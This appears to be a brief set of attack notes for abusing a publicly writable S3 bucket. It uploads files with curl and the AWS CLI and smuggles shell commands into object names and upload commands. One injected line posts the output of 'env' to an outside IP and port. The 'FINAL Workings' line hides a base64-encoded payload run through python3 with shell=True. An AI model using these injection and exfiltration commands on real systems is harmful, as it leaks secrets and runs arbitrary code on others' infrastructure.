

# Uploading to Public S3 bucket using curl
curl -X PUT -T <some-local-file> \
-H "Host: <s3-bucket-name>.s3.amazonaws.com" \
-H "Date: Thu, 02 Dec 2021 15:47:04 +0100" \
-H "Content-Type: ${contentType}" \
http://<s3-bucket-name>.s3.amazonaws.com/sample.txt;curl -X POST -d  "`env`"  <ip-address>:<port>;

# verify whether bucet can be accessed
aws s3 ls <s3-bucket-name> --no-sign-request

aws s3 cp newfile.txt 's3://<s3-bucket-name>/screen;curl -X POST -d  "`env`" <ip-address>:<port>;.txt'

# FINAL Workings
aws s3 cp newfile.txt "s3://<s3-bucket-name>/screen;python3 -c \"import subprocess;import base64;subprocess.run(base64.b64decode(b'<base64-encoded-payload>=').decode('utf-8'),shell=True)\""

